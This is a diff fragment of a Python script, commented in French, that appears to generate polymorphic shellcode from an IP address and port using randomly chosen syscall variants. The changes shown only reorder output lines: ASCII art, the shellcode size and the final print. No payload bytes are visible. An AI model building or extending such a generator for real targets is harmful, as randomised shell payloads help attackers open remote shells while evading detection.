@@ -50,17 +50,6 @@ def shellcodize(s):
     print("Shellcode polymorphique: \n")
     print(shellcode)
 
-
-
-shellcodize(shellcode)
-
-print(shellcodeart)
-
-print("------------")
-print("La taille du shellcode est de : ",(len(shellcode)), "octets")
-print("\n")
-
-
 ipv4 = ip_to_hex(ipv4)
 port = port_to_hex(port)
 
@@ -282,8 +271,10 @@ shellcode += random.choice(list_xorsyscall)
 shellcode += random.choice(list_lastcallsys)
 
 # ASCII Art pour flex
+print(shellcodeart)
 
 
-
-#shellcodize(shellcode)
-#print("Taille shellcode : ", len(shellcode))
+print("------------")
+print("La taille du shellcode est de : ",(len(shellcode)), "octets")
+print("\n")
+shellcodize(shellcode)
